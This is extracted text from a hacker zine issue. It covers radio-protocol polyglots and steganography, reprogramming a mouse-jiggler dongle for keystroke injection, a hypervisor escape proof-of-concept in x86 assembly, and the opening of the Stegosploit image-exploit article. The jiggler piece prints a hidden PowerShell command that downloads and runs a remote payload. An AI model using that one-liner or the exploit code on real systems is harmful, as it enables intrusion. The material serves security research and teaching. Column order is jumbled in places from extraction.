But it ain’t so easy. President Scudder has di-
rected Eve at the Fair Communications Commis-
sion 12 to strictly monitor and brutally enforce radio
regulations, defending the principles of Shortwave
Neutrality and protecting the youth from microun-
safeties.
So Alice and Bob need to make a shortwave ra-
dio polyglot, valid in more than one format. In-
tent on her mission, Eve is listening. So when Al-
ice and Bob’s transmissions are sniffed by Scudder’s
National Safety Agency or overheard by the gen-
eral public, they must appear to be a popular ap-
proved plaintext protocol. It must appear the same
on a spectrum waterfall, must decode to a valid
4.1
All You Need Is Sines
Well, not really. But it sure looks that way when
you read about radio: sines are everywhere, and you
build your signal out of them, using variations in
their amplitude, frequency, phase to transmit infor-
mation. 14 This stands to physical reason, since the
sine wave is the basic kind of electromagnetic oscilla-
tion we can send through space. Of course, you can
add them by putting them on the same wire, and
multiply them by applying one signal to the base
of a transistor through which the other one travels;
you can also feed them through filters that suppress
all but an interval of frequencies.
You can see these sines in the signal you re-
ceive on the waterfall display of Baudline or FLDigi,
which show the incoming signal in the frequency
domain by way of the Fourier transform. PSK31
transmissions, for example, will look like nice nar-
row bands on the waterfall view, which is the point
of its design.
The waterfall view is close to how a mathemati-
cian would think about signals: all input whatsoever
is a bunch of sine waves from all across the spec-
trum, even noise and all. A perfectly clean sine wave
such as a carrier would make a single bright pixel
10 You could also use loud speakers, but please don’t. Pastor Laphroaig reminds us that there is a special level of hell for such
people, who will spend Eternity next to those who scratch fingernails on chalk boards.
11 unzip pocorgtfo08.pdf ifthisgoeson.txt
12 Which some haters call Fundamentalist instead of Fair, but that’s unsafe speech. Unsafe speech has consequences, neighbors.
You don’t want to find out about the consequences, so stay safe!
13 Campfires are definitely not safe, so enjoy them while they last!
14 Some combinations are useful, such as amplitude and phase, used, e.g., in DOCSIS; others aren’t so useful, such as phase
and frequency, because changes in one can’t always be told from changes in the other.
10in every line, a single bright 1-pixel stripe scrolling
down. That line would expand to a multi-pixel band
for a signal that is the carrier being modulated by
changing its amplitude, frequency, or phase in any
way, with the width of the band being the double
of the highest frequency at which the changes are
applied. 15
Of course, the actual construction of digital radio
receivers has very little to do with this mathemati-
cian’s view of the signal. While a mix of ideal sines
would neatly fall apart in a perfect Fourier trans-
form, the real transform of sampled signal would
have to be discrete, and would present all the in-
teresting problems of aliasing, edge effects, leakage,
scalloping, and so on. Thus the actual receiving
circuits are specialized for their intended protocols
particular kinds of modulation, designed to extract
the intended signal’s representation and ignore the
rest—and therein lies Alice’s and Bob’s opportunity.
4.2
we’ll be better at designing new means of communi-
cation for having thought about them.
4.3
Classic PSK31
PSK31 is best described in an article by Peter Mar-
tinez, G3PLX. 19 Here, we’ll present a slightly sim-
plified version, ignoring the QPSK extension and
parts of the symbol set, so be sure to have a copy
of Peter’s article when implementing any of these
techniques yourself.
This is a Binary Phase Shift Keyed protocol,
with 31.25 symbols sent each second. It consumes
just a bit more than 60 Hz, allowing for many PSK31
conversations to fit in the bandwidth of a single voice
channel.
The PSK31 signal is commonly generated as au-
dio then sent with Upper SideBand (USB) modu-
lation, in which the audio frequency (1 kHz) is up-
shifted by an RF frequency (28.12 MHz) for trans-
mission. For reception, the same thing happens in
reverse, with a USB shortwave receiver downshifting
the radio frequencies to the audio range. In older
radios, this is performed by an audio cable. More
modern radios, such as the Kenwood TS-590, im-
plement a USB Audio Class device that can be run
digitally to a nearby computer.
Because many different PSK31 transmissions can
fit within the bandwidth of a single voice channel,
modern PSK31 decoders such as FLDigi are capable
of decoding multiple conversations at once, allowing
an operator to monitor them in parallel. These par-
allel decodings are then contributed to aggregation
websites such as PSKReporter that collect and map
observations from many different receivers.
Related Work
In 2014, Paul Drapeau (KA1OVM) and Brent
Dukes released jt65stego, a patched version of the
JT65 mode that hides data in the error correcting
bits. 16,17 The original JT65 by Joe Taylor (K1JT)
features frames of 72 bits augmented by 306 error-
correcting bits, 18 so Drapeau and Dukes were able
to hide encrypted messages by flipping bits that nor-
mal radios will flip back. This reduces the odds of
successfully decoding the cover message, but they
do correct for some errors of the ciphertext.
Our concern in this article is not really stego,
though that will be covered. Instead, we’ll be look-
ing at which protocols can be combined, embedded,
emulated, and smuggled through other protocols.
We’ll play around with all sorts of crazy combi-
nations, not because these combinations themselves
are a secure means of communication, but because
4.3.1
Varicode
Instead of ASCII, PSK31 uses a variable-length
character encoding scheme called Varicode. This
15 This is easy to see for frequency and phase, since these changes are added to the argument of the sine A · sin(ω · t + θ),
the frequency ω and the phase θ. Seeing this for the amplitude A is a bit trickier, but imagine A to be another sine wave,
modulating the carrier. Then we deal with the product of two sines, and this is, by the age-old trigonometric identities
sin(α + β) = sin(α)cos(β) + cos(α)sin(β) and sin(α − β) = sin(α)cos(β) − cos(α)sin(β); hence adding these and remembering
that the cosine is the sine shifted by π/2, sin(α)sin(β + π/2) = 2 1 (sin(α + β) + sin(α − β)). That is, a product of sines is the
arithmetic average of the sines of the sum and the difference of their arguments. If α is the carrier and β is the change, the
rainfall diagram will show the band from α − β to α + β, that is 2β-wide.
Seeing this sum and knowing the carrier frequency, one might wonder: can’t we make do with just one term of the sum α + β,
and ignore α − β? Indeed, if one applies a filter to cut the frequencies less than the carrier from the transmitted signal, one can
save half the bandwidth and still recover the signal β. This trick is known as the Upper Side Band, and it used for the actual
digital radio transmissions.
16 https://github.com/pdogg/jt65stego
17 Steganography in Commonly Used HF Protocols, Drapeau and Dukes, Defcon 22
18 unzip pocorgtfo08.pdf jt65.pdf
19 unzip pocorgtfo08.pdf psk31.pdf
11character set features many of the familiar ASCII
characters, but they are rearranged so that the most
common characters require the fewest bits. For ex-
ample, the letter e is encoded as 11, using two bits
instead of the eight (or seven) that it would consume
in ASCII. Lowercase letters are generally shorter
than upper case letters, with uncommon control
characters taking the most bits.
A partial Varicode alphabet is shown in Figure 2.
Additionally, an idle of at least two 0 bits is required
between Varicode characters. No character begins or
ends with a 0, and for clock recovery reasons, there
will never be a string of more than six 1 bits in a
row.
4.3.2
So what’s a phase reversal? It just means that
what used be the peak of the wave is now a trough,
and what used to be the trough is now a peak.
4.3.3
Decoding
As described in Martinez’ PSK31 article, a receiver
first uses a narrow bandpass filter to select just one
PSK31 signal.
It then multiplies that signal with a time-delayed
version of itself to extract the bits. The output will
be negative when the signal reverses polarity, and
positive when it does not.
Once the bits are in hand, the receiver splits
them into Varicode characters. A character begins
as the first 1 after at least two zeroes, and a char-
acter ends as the last 1 before two or more zeroes.
After the characters are split apart, they are parsed
by a lookup table to produce ASCII.
Encoding
To encode a message, letters are converted to bits
through the Varicode table, delimited by 00 to keep
them distinct. As PSK31 is designed for live use by
a human operator in real time, any number of zeroes
may be appended. That is, “e e” can be rendered
to 110010011, 110000010011, or 1100100011; there
is no difference in meaning, only transmission time.
PSK31 encodes the bit 1 as a continuous carrier
and the bit 0 as a carrier phase reversal. So the
sequence 11111111 is a boring old carrier wave, no
different from holding a Morse key for a quarter-
second, while 00000000 is a carrier that inverts its
phase every 31.25 ms.
4.4
4.4.1
PSK31 Stego
Extending the Varicode Character Set
G3PLX’s original article contains a second part, in
which he notes that his original protocol provides no
support for extended characters, such as the British
symbol for pounds sterling, £. Wishing to add such
characters, but not to break compatibility, he noted
that the longest legal Varicode character was ten
12Figure 1: PSKReporter, a Service for Monitoring PSK31
not terribly uncommon to see forgotten transmitters
spewing limitless streams of zeroes into the ether as
their operators sit idle, never typing a character that
would result in a zero. Alice can abuse this to hide
extra information by encoding data in the variable
gap between characters.
For an example, Alice might place the minimal
pair of zero bits (00) between characters to indicate
a zero while a triplet (000) indicates a one.
bits long. Anything longer was ignored by the re-
ceiver as a damaged and unrecoverable character, so
PSK31 uses those long sequences for extended char-
acters.
Reviewing the source code of a few PSK31 de-
coders, we find that Varicode still has not defined
anything with more than twelve bits. By prefix-
ing the character Alice truly intends to send with
a pattern such as 101101011011, she can hide spe-
cial characters within her message. To decode the
hidden message, Bob will simply cut that sequence
from any abnormally long character.
4.4.2
4.4.3
Extending the Symbol Set
In its classic incarnation, PSK31 uses Binary Phase
Shift Keying (BPSK), which means that the phase
flips 180 degrees. This is sometimes called BPSK31,
to distinguish it from a later variant, QPSK31,
which uses Quadrature Phase Shift Keying (QPSK).
Hiding in Idle Lengths
PSK31 requires at least two 0 bits between char-
acters, but it doesn’t specify an exact limit. It’s
1311101
11111
1
10110111
10111101
11101101
11111111
101110111
101011011
101101011
110101101
110101011
110110111
LF
CR
SP
0
1
2
3
4
5
6
7
8
9
1011
1011111
101111
101101
11
111101
1011011
101011
1101
111101011
10111111
11011
111011
1111
111
111111
110111111
10101
10111
101
110111
1111011
1101011
11011111
1011101
111010101
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
1111101
11101011
10101101
10110101
1110111
11011011
11111101
101010101
1111111
111111101
101111101
11010111
10111011
11011101
10101011
11010101
111011101
10101111
1101111
1101101
101010111
110110101
101011101
101110101
101111011
1010101101
Figure 2: Partial PSK31 Varicode Alphabet
14
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
ZQPSK performs phase changes in multiples of 90 de-
grees, providing G3PLX extra symbol space to per-
form error correction.
Alice can use the same trick to form a polyglot
with BPSK31, but this presents a number of signal
processing challenges. Simply using the 90-degree
shifts of QPSK31 would be a bit of an indiscretion,
as BPSK interpreters would have wildly varying in-
terpretations of the message, often decoding the hid-
den bits to visible junk characters.
Using a terribly small shift is a tempting idea,
as Alice’s use of balanced 170 and 190 degree transi-
tions might be rounded out to 180 degrees by the re-
ceiver. Unfortunately, this would require extremely
stable and well tuned radio equipment, giving Bob
as much trouble receiving the signal as Eve is sup-
posed to have!
Instead of adding additional phases to BPSK31,
we propose instead that the error correction of
QPSK31 be abused to encode additional bits. Alice
can encode data by intentionally inserting errors in
a QPSK31 bitstream, relying upon Eve’s receiver to
remove them by error correction. Bob’s receiver, by
contrast, would know that the error bits are where
the data really is.
4.5
of clever tricks were thought up. Figure 4 shows
RTTY artwork from W2PSU’s article in the Septem-
ber 1977 issue of 73 Magazine. Lacking computer-
ized storage and cheap audio cassettes, it was the
style at the time to store long stretches of paper
tape as rolls in pie tins, with taped labels on the
sides.
Figure 6 describes Western Union’s ITA2 alpha-
bet used by RTTY, which is often—if imprecisely—
called Baudot Code. In that figure, 1 indicates
a high-frequency mark while 2 indicates a low-
frequency space. Note that these letters are sent
almost like a UART, least-significant-bit first with
one start bit and two stop bits.
4.6
4.6.1
RTTY—pronounced “Ritty”—is a radio extension of
military teletypewriters that has been in use since
the early thirties. It consists of five-bit letters, us-
ing shifts to implement uppercase letters and foreign
alphabets. Although implementation details vary,
most amateur stations use 45 baud, 170Hz shift,
1 start bit, 2 stop bits, and 5 character bits. The
higher frequency is a mark (one), while the lower
frequency is a space (zero).
As more digital protocols other than CW and
RTTY weren’t legalized until the eighties, all sorts
10101101
C
101101
d
10101101
C
00
0
00
0
00
0
111011101
Q
11
e
1110111
E
000
1
000
1
0
1
[SP]
1
[SP]
0
Differing Diddles
Unlike a traditional UART, RTTY sends an idle
character—colloquially known as a Diddle—of five
marks when no data is available. This is done to
prevent the receiver from becoming desynchronized,
but it isn’t strictly mandatory. By not sending the
diddle character (11111) when idle, the mark bit’s
frequency can be left idle for a bit, encoding extra
information.
Additionally, there are not one but two possi-
ble diddle characters! Traditionally the idle is filled
with 11111, which means Shift to Letters, so the
transmitter is just repeatedly telling the receiver
that the next character will be a letter. You could
also send 11011, which means Shift to Figures.
Sending it repeatedly also has no effect, and jumping
between these two diddle characters will give you a
side-channel for communication which won’t appear
in normal RTTY receivers. As an added benefit, it
is visually less conspicuous than causing the right
channel of your RTTY broadcast to briefly disap-
Classic RTTY (ITA2)
BPSK
PSK31
Idle
BPSK
PSK31
Idle
BPSK
PSK31
Idle
Some Ditties in RTTY
00
0
00
0
0
10101101
C
1111101
A
0
000
1
000
1
0
111011101
Q
10111101
1
Figure 3: 010100101000 Hidden in PSK31 Idle Bits
15
0
00
0
00
0
0
1
[SP] 00
1111111
I 00
0
0
0Figure 4: RTTY Art of Seattle Slew from the mid 1970’s
Figure 5: Weather Fax
1600000
00100
10111
10011
00001
01010
10000
10101
00111
00110
11000
10110
00011
00101
01001
01101
Letter
Null
Space
Q
W
E
R
T
Y
U
I
O
P
A
S
D
F
Figure
Null
Space
1
2
3
4
5
6
7
8
9
0
–
Bell
WRU?
!
11010
10100
01011
01111
10010
10001
11101
01110
11110
11001
01100
11100
01000
00010
11011
11111
Letter
G
H
J
K
L
Z
X
C
V
B
N
M
CR
LF
FIGS
Figure
&
#
’
(
)
”
/
:
;
?
,
.
CR
LF
LTRS
Figure 6: RTTY’s ITA2 Alphabet
pear!
4.6.2
unable to keep up with an expert or impatiently
waiting on a station that transmits slowly, so short-
hand was developed to ask the other side to change
rate. QRQ requests that the other side transmit more
quickly, and QRS requests that the other side slow
down.
Stop with the Stop Bits!
RTTY is described in the old UART tradition as
5/N/2, meaning that it has 5 data bits, No parity
bits, and 2 stop bits. There’s a cool trick to UARTs
that’s worth remembering: the transmitter can al-
ways have more stop bits than the receiver demands,
and the receiver can always demand fewer stop bits
than the transmitter sends.
4.7
QRSS is a variant of CW in which the message
is sent very, very slowly. Rather than a dot last-
ing a fraction of a second, it might last as long as
a minute! A receiver can then take a recording of a
very weak signal, slow down the recording, and vi-
sually observe the signal to determine its meaning.
Toe Tappin’ CW
Carrier Wave (CW) modulation—better known as
Morse code—was the first widely deployed digital
mode to replace spark-gap transmitters. Designed
for a human operator to manually use, CW is a per-
fect choice for easy polyglots.
As a quick review, CW consists of dots and
dashes. A dash is three times as long as a dot. The
off-time between elements of a letter is as long as a
dot, and the off-time between letters in a word is as
long as a dash. The off-time between words is seven
times as long as a dot, or a bit more than twice as
long as a dash.
4.7.1
While protocols such as RTTY and PSK31 don’t
take kindly to the sorts of frequent interruptions
that normal CW would impart, these protocols
can easily produce QRSS transmissions that are
legible by slowing down recordings. For exam-
ple, Alice might send “A1BOB A1BOB de A1ICE” for
a dot and “A1BOB A1BOB de A1ICE. A1BOB A1BOB
de A1ICE. A1BOB A1BOB de A1ICE.” for a dash.
QRSS
While other protocols have standard data rates,
Morse relies on the recipient to adjust to the rate
of the transmitter. Operators often find themselves
This is of course a bit easy to recognize from a
waterfall, but it might be a fun way to meet your
neighbors!
174.7.2
From Ethernet to Æther with Made-
line
In a row house in Philly
that was covered with vines
Was an Ethernet network
in four twisted lines
In four twisted lines
they ran to the laundry
And to the satellite dish
and to the pantry
The twists ended too soon
and ceased to align
Interfering with 10 meters
all down the line
The protocol
was Madeline.
4.8
All of this high-falutin’ theorizin’ don’t do a lick of
good without some software to back it up. Sup-
posing that Alice is a modern unix programmer,
but that Bob hasn’t written code for anything more
modern than a Commodore 64, Alice will need to
provide him with a GUI application that easily in-
terfaces with his radio.
The most direct route for this is to patch FLDigi,
a popular open source application for digital com-
munication over ham radio with a live operator. In-
ternally, FLDigi implements softmodems for CW,
PSK31, RTTY, WEFAX, and several other proto-
cols.
It’s clear enough that you could transmit Morse
code through Wifi by sending bursts of traffic, but
what about wired Ethernet?
Some folks are very particular when wiring
CAT5e cable, ensuring that the twisted pairs are
untwisted at the last possible position before the
connector. Other folks—such as your neighborly
authors—are far less particular in their wiring, and
when the wiring is performed poorly, interference is
observed near 28.121 MHz!
4.9
Part 97; or, Don’t be a Jerk!
Be aware that in general, it’s both illegal and im-
moral to be a jerk on the amateur bands. Interfer-
ence is forbidden in amateur radio, not because jam-
ming research is bad, but because it’s rude to stomp
on someone else’s transmission. Cryptography is
forbidden in amateur radio, not because of any evil
conspiracy to destroy privacy, but because cryp-
tography makes a transmission opaque, preventing
newcomers from joining the conversation.
So for those of you who do not live in Nehemiah
Scudder’s oppressive theocracy, please be so kind as
to keep your polyglot messages unencrypted. Make
a fox hunt of sorts out of your protocol experimen-
tation, with the surface PSK31 message advertising
your callsign along with the name and parameters
of your real protocol.
–——–
———
—–—–
We hope that this article has taught you a lit-
tle about radio and signal processing. Get an ama-
teur license, build a station, and start experimenting
with new protocols on the friendly airwaves.
Still better, the interference varies with traffic!
When the network is idle, the interference appears
as a nice thin carrier wave. When the network is
busy, the interference grows to be nearly four hun-
dred Hertz wide.
The following is a letter of Morse code transmit-
ted from (poorly) wired Ethernet to the 10-meter
band through what we are calling the Madeline pro-
tocol. This transmission isn’t strong enough to carry
very far, but the Baudline-generated waterfall in
that figure was recorded from outside of a real house,
with a signal generated by a real Ethernet network.
The recording was made by an Upper SideBand re-
ceiver tuned to 28.120 MHz. 20 The narrow-band
signal at 28.121 MHz becomes wide whenever lots
of traffic goes across the wired network; in this case,
from activity on a VNC session.
20 unzip
Patching FLDigi
73’s from Appalachia,
—Travis and Muur
pocorgtfo08.pdf madelinek.wav
18195
Jiggling into a New Attack Vector
by Mickey Shkatov
Note: The manufacturer of the device discussed
in this article is not distributing anything danger-
ous. This is a legitimate tool that can be made into
something dangerous.
One day, during a conversation with my col-
league Maggie Jauregui, she showed me a USB
dongle-like device labeled Mouse Jiggler and told
me this nifty little thing’s purpose is to jiggle the
mouse cursor on the screen. Given my interest in
USB, I expected that the device might be a cheap
microcontroller emulating USB HID. If there were a
way to reprogram that microcontroller, it could be
made into something malicious!
I looked for more information about this pecu-
liar device. I found the exact same model (the MJ-2)
that Maggie had showed me, but the website listed
information about a newer, smaller model, the MJ-
3. As the website describes it, of this device was just twenty dollars, which is quite
cheap if you ask me.
While I waited for the thing to arrive, I contin-
ued to read some other interesting facts about the
device. Here are some highlights:
The MJ-3 is programmable, making it
ideal for repetitive IT or gaming tasks.
You can create customized scripts with
programmed mouse movement, mouse
clicks, and keystrokes. A quick look at WiebeTech, the company that
makes these devices, reveals the forensic nature of
the use case.
WiebeTech, the manufacturer of the MJ-3,
makes all sorts of forensics equipment including
write-blocks, forensic erasers, digital investigation
tools, and other devices.
I already had plans to sniff the USB traffic, track
down the microcontroller datasheet, and create a
1. MJ-3 is even smaller—roughly the size of a
dime—at just 0.75” x 0.55” x 0.25” (18mm x
14mm x 6mm).
2. IT professionals use the Mouse Jiggler to pre-
vent password dialog boxes due to screensavers
or sleep mode after an employee is terminated
and they need to maintain access to their com-
puter.
3. Computer forensic investigators use Mouse
Jigglers to prevent password dialog boxes from
appearing due to screensavers or sleep mode.
“The MJ-3 is programmable.” There was really
no need to read any further. This was all the moti-
vation I needed. I purchased one online. The cost
20tool to reprogram it. However, I later found a com-
mercial piece of software that does exactly that. I
had to download and play with it.
This software was able to program the MJ-3 to
be a keyboard, pre-programmed with up to two hun-
dred key strokes that cycle in a loop.
To sum up, we’ve got a tiny USB dongle that
looks like a wireless mouse receiver. It is pro-
1
grammable with keystrokes, and costs next to noth-
ing. So what’s next? Malicious re-purposing, of
course!
Unlike other programmable USB HID devices—
such as the USB Rubber Ducky, which has far
greater storage capacity for keystrokes—we are left
with only about 200 characters.
I say characters because it is easy to explain that
way. Each line item in a script for this device can
hold more than a single character. Each item holds
a combination of modifier keys, a letter key, and a
delay of up to 255 seconds. The byte-by-byte break-
down and explanation can be found at the end of
this article.
These are 200 characters:
OOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
OOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
OOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
OOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
OOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
OOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
OOOOOOOOOOOOOOOOOOOO
Not a lot, but still enough for some fun. Let’s be-
gin by opening an administrator command prompt.
and easy. However, a red teamer wanting to use
this thing would need more than just a command
prompt. How about a PowerShell download and ex-
ecute one liner from the Rubber Ducky Exploit wiki
written by Mubix? If we use a URL-shortening ser-
vice, we can save a few characters and squeeze that
into something like the following 152 characters.
p o w e r s h e l l −w i n d o w s t y l e hi dd en ( new−o b j e c t
System . Net . WebClient ) . DownloadFile ( ' h t t p
: / / b i t . l y /1 ngVd9i ' , ' %TEMP%\bob . z i p ' ) ;
S t a r t −P r o c e s s "%TEMP%\bob . z i p "
I’ll leave the rest of the red team thinking to you.
If you do make a cool and nifty script, please share
it. You can find the dump and description of the
sniffed USB communication below. Enjoy!
–——–
———
—–—–
Dongle programming communication looks like
this, as a sequence of OUT data packets in order.
• 0B 00 30 00 AA 04 00 00 92
Prefix packet indicating the number of com-
mands to be sent and ending in some sort of
checksum (92). The only checksum/CRC link
found in the client software uses the QT check-
sum function, which is CRC16-CCITT based.
Why don’t you try to figure this one out?
• 0B 01 32 02 FF 04 00 00 00
Data packet specifying a command.
ure 7.)
(Fig-
• 0B 02 32 00 00 05 00 00 00
Data packet specifying a command.
1. Press Ctrl+Escape. Delay 0 seconds.
2. Press C. Delay 0 seconds.
• 0B 03 32 00 00 06 00 00 00
Data packet specifying a command.
3. Press M. Delay 0 seconds.
4. Press D. Delay 0 seconds.
• 0B 04 35 00 01 00 00 00 00
Data packet specifying the final command
telling the controller to jump to which com-
mand after the last one has been executed.
5. Press Ctrl+Shift+Enter. Delay 2 seconds.
6. Press Left arrow. Delay 0 seconds.
7. Press Return (Enter). Delay 0 seconds.
• 0C 00 00 00 00 00 00 00 00
A suffix command to indicate the end of pro-
gramming.
8. Delay 2 seconds.
Once the last event is done, we might simply tell
the controller to jump to Event 8 to remain in a
delay loop and stop executing.
The result is an eight-line script for opening
an administrator command prompt, which was fun
Each command to be programmed on the
controller is sent over USB. As an example,
Figure 7 examines the bytes of the “Windows
key+Ctrl+Alt+Shift+A” line of the script.
210B
01
32
02
FF
04
00 00 00
0B 01 32 02 FF 04 00 00 00
A prefix sent with each data packet
The index of the command sent in this data packet
Packet type:
31 is Mouse
32 is Keyboard
34 is Delay
The delay in seconds after the keystroke has been performed by the controller.
A bit flag for indicating key modifiers pressed.
88 Windows key–10001000
44 Alt key–01000100
22 Shift key–00100010
11 Ctrl key–00010001
Represents the keyboard letter A.
See Figure 8.
Padding
Figure 7: Example Jiggler Packet: “Windows key+Ctrl+Alt+Shift+A”
0
4
5
6
7
8
9
A
B
C
D
E
F
10
11
12
13
14
15
16
17
18
19
1A
1B
1C
1D
1E
1F
20
21
No Key
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
1
2
3
4
22
23
24
25
26
27
28
29
2A
2B
2C
2D
2E
2F
30
31
33
34
35
36
37
38
39
3A
3B
3C
3D
3E
3F
40
41
5
6
7
8
9
0
Return
Escape
Delete
Tab
Space
—
=
[
]
\
;
’
‘
,
.
/
Caps Lock
F1
F2
F3
F4
F5
F6
F7
F8
42
43
44
45
4A
4B
4C
4D
4E
4F
50
51
52
53
54
55
56
57
58
59
5A
5B
5C
5D
5E
5F
60
61
62
63
F9
F10
F11
F12
Home
Page Up
Delete Forward
End
Page Down
Right Arrow
Left Arrow
Down Arrow
Up Arrow
Num Lock
/ Keypad
* Keypad
Enter Keypad
1 Keypad
2 Keypad
3 Keypad
4 Keypad
5 Keypad
6 Keypad
7 Keypad
8 Keypad
9 Keypad
0 Keypad
. Keypad
Figure 8: Jiggler Keycode Table
22236
The Hypervisor Exploit I Sat on for Five Years
by DJ Capelis and Daniel Bittman
Among its many failings, peer review is especially deficient when it comes to computer security. The idea
that a handful of busy researchers will properly review a security system described solely in a paper in the
time they’re reading through a large stack of papers is one of the extreme blind spots of our field’s academic
process.
It is not surprising systems with holes appear in published literature. Unfortunately, there’s not even
a good process to correct these situations when holes are found. The authors of papers are not required
to provide code, so even if one suspects a hole exists, writing a proof of concept requires reconstructing
the system described in the paper sufficiently well enough to have something to exploit. And then, of
course, there’s no point in doing any of this work, since “I found a bug in a published system” is not usually
publishable, unlike every single other branch of science where disproving a published result is notable. In
computer science, it’s never notable when our papers are broken.
So neighbors, this was the situation I found myself in for the past five years or so, as I sat on a hypervisor
bug in a research system no one really used. The authors, meanwhile, ignored e-mails, filed a patent on the
technology described in their paper, and went on to continue a successful career in research.
Luckily, in the intervening years, a few things happened:
1. PoC||GTFO started publishing, which means anything our Pastor likes can be published here. And,
especially when the Pastor has been drinking, obscurity is no bar to entry.
2. I ran into Daniel, who was building an operating system anyway and figured making a PoC for this
bug was something he might as well do. (I was too fed-up by this point to spend the time on it.)
So without further ado, let me describe the system we pwn’d and how we pwn’d it.
The paper we’re breaking in this article is Secure In-VM Monitoring Using Hardware Virtualization,
published in 2009 at the ACM Conference on Computer and Communications Security. As these things go,
in academia this is considered a “top tier” conference. Back in the dark ages, when dragons roamed the earth,
and we didn’t have support of Extended Page Tables (EPT) in our Intel chips, rapid page table switches were
expensive. The goal of this paper was to allow quick switching between security contexts without requiring
an expensive VMEXIT/VMENTER. The researchers cleverly leveraged CR3 Target Values, which allow a
limited (4, usually) set of addresses that non-root VMX code can set as the page tables base in the CR3
register. This effectively allows an untrusted operating system to switch page tables into the code used to
do introspection without causing a VMEXIT.
This neat hack caused the average overhead of their syscall introspection code to go from 46% to 4%.
Which basically means that their system moved from an unreasonable performance penalty down to a level
where someone could take it seriously. Which is nice, if they could keep the same security guarantees.
The security constraints were implemented in the page tables, as shown in Figure 9.
In theory, this page table setup means that the system under monitoring can never set a CR3 value
without causing a fault, except by going through the entry and exit gates. Attempts to jump directly to the
introspection code fail since those pages aren’t mapped into the monitored code’s view of memory. Attempts
to change the CR3 value to the introspection code’s page tables outside the entry gates fail because the
next instruction executes in the context of the introspection code, where all those pages aren’t mapped
as executable. The only way to jump into the introspection code, according to the paper, is through the
entry/exit gates code present in the shared gate pages and mapped as executable in both.
What we really want is a way to cause the processor to jump and move page tables at the same time. In
some other architectures (SPARC, for instance) there’s the concept of a delay slot, where some instructions
take another instruction to fill otherwise empty pipeline bubbles. In an architecture like this, jumping out
of the security boundary is trivial. . . but this is x86; x86 doesn’t have delay slots, right?
Turns out, that is not exactly true. Quoth the Intel Architecture Manual Volume 2B on the STI instruc-
tion:
24Figure 9: Page Table Security Constraints
Figure 10: SeaOS Exploit Running on Real Hardware
25After the IF flag is set, the processor begins responding to external, maskable interrupts
after the next instruction is executed. The delayed effect of this instruction is provided to allow
interrupts to be enabled just before returning from a procedure (or subroutine). For instance,
if an STI instruction is followed by a RET instruction, the RET instruction is allowed to execute
before external interrupts are recognized.
All we need to do is turn off interrupts, queue one, route the interrupt handler into the introspection
code’s address space, then MOV the introspection code’s page table base into CR3 right after we re-enable
interrupts with the STI instruction. Then we can just ROP our way through the monitor code and do as we
please.
And that’s where I stopped at three o’clock in the morning five years ago. I had the concept, but it took
us another five years to getting around to proving it works on real hardware. As you can see in Figure 10,
it totally does.
The final exploit turned out a little different. The most straightforward way to implement this in practice
is to utilize the trap flag (TF). When you enable this, POPF has the same one-instruction delayed behavior
that we see in STI, and so you merely just set TF with POPF and move a new value into CR3 as the next
instruction. Thus, the resulting code looks like this:
1 cli
mov rsp , 0 x2500 ; we ' l l need a s t a c k f o r t h e i n t e r r u p t h a n d l e r
3 mov rax , qword [ 0 x1000 ] ; r e a d t h e monitor ' s CR3 from somewhere i n t h e t r a p code
lidt [ i d t r ] ; load the interrupt t a b l e
5 pushfq ; g e t the f l a g s
or qword [ r s p ] , 100000000 b ; s e t TF
7 popf ; s e t t h e f l a g s
mov cr3 , r a x ; change a d d r e s s s p a c e s
9 ; <−−− TF t r i g g e r s i n t e r r u p t h e r e
loop :
11 jmp loop
6.1
Reproducibility
Everything you see here can be reproduced by running the code in the vm-exploit branch of the SeaOS
kernel tree. 21 The code for the proof of concept itself is also in that repository. 22
6.2
Concluding Rant
The scientific community has a structural problem. In computer science, we do not require researchers to
build real systems that can be scrutinized. We do not have a mechanism for thorough review, so we generally
do not bother publishing work that breaks another paper. Our field just doesn’t consider a broken paper to
be particularly notable.
Academics in computer science are too often doomed to talk nonsense unless we fix these issues. Fur-
ther, researchers in our field are continuing to verge towards irrelevance if they simply follow the system of
incentives that makes it a better career move to drop a paper and file a patent than do the work of building
real systems and determining real truths about our machines.
To the authors of this paper in particular?
Enjoy your useless fucking patent.
Love,
~djc
21 https://github.com/dbittman/seakernel/
unzip pocorgtfo08.pdf seakernel-exploit.zip
22 https://github.com/dbittman/seakernel/blob/vm-exploit/drivers/shiv/ex.s
267
Stegosploit
by Saumil Shah
Stegosploit creates a new way to encode browser
exploits and deliver them through image files.
These payloads are undetectable using current
means. This paper discusses two broad underlying
techniques used for image-based exploit delivery—
Steganography and Polyglots. Browser exploits are
steganographically encoded into JPG and PNG im-
ages. The resultant image file is fused with HTML
and Javascript decoder code, turning it into an
HTML+Image polyglot. The polyglot looks and
feels like an image, but is decoded and triggered in
a victim’s browser when loaded.
browser exploits are written in code that is in-
terpreted by the browser (Javascript) or by pop-
ular browser add-ons (ActionScript/Flash). When
it comes to browser exploits, typical means of
detection avoidance involve payload obfuscation;
some browser exploits will obfuscate individual char-
acters, 23 while others will split the attack code
over multiple script files. Others will use OLE-
embedded documents or split the attack code be-
tween Javascript and Flash using ExternalInter-
face. 24
Exploit detection technology relies upon content
inspection of network traffic or files loaded by the
application (browser). Content is identified as suspi-
cious either by signature analysis or behavioral anal-
ysis. The latter technique is more generic and can
be used to detect 0-day exploits as well.
I began experimenting with exploit delivery tech-
niques involving containers that are presumed pas-
sive and innocent: images. As a photographer, I
have had a long history of detailed image analysis,
exploring image metadata and watermarking tech-
niques to detect image plagiarism. Is it possible to
deliver an exploit using images and images alone?
My first attempt was to convert Javascript code
into image pixels, each character represented by an
8-bit grayscale pixel in a PNG file. The offensive
Javascript exploit code is converted into an inno-
cent PNG file. The PNG image is then loaded in
a browser and decoded using an HTML5 CANVAS.
Decoding is performed via Javascript. The decoder
code itself is not detected as being offensive, since it
only performs CANVAS pixel manipulation.
Representing Javascript as PNG pixels was ex-
plored in 2008 by Jacob Seidelin for an entirely
different reason, compressing bulky Javascript li-
braries. 25
